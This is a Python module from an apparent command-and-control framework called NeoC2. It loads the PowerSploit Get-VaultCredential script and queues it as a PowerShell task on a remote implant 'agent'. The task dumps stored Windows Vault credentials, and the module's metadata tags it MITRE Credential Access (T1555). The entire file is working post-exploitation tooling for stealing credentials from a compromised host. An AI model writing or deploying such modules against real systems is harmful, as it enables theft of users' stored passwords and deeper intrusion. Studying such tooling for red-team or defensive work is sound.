# modules/getvaultcreds.py
import os
import importlib.util
import base64
import re


def get_info():
    """Get module information"""
    return {
        "name": "getvaultcreds",
        "description": "Execute a PowerShell command to retrieve credentials from Windows Vault",
        "type": "enumeration",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1555,T1059.001",
        "mitre_tactics": ["Credential Access"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the vault credential retrieval on",
                "required": True
            },

        }
    }


def execute(options, session):
    """Execute the getvaultcreds module with given options and session"""
    agent_id = options.get("agent_id")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    

    
    # Read the original Get-VaultCredential.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Get-VaultCredential.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find vault credential script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading vault credential script: {str(e)}"
        }
    
    # Build the execution command with parameters
    execution_command = f"{original_script}\nGet-VaultCredential"
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Get-VaultCredential task {task_id} queued for agent {agent_id}",
                "task_id": task_id
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }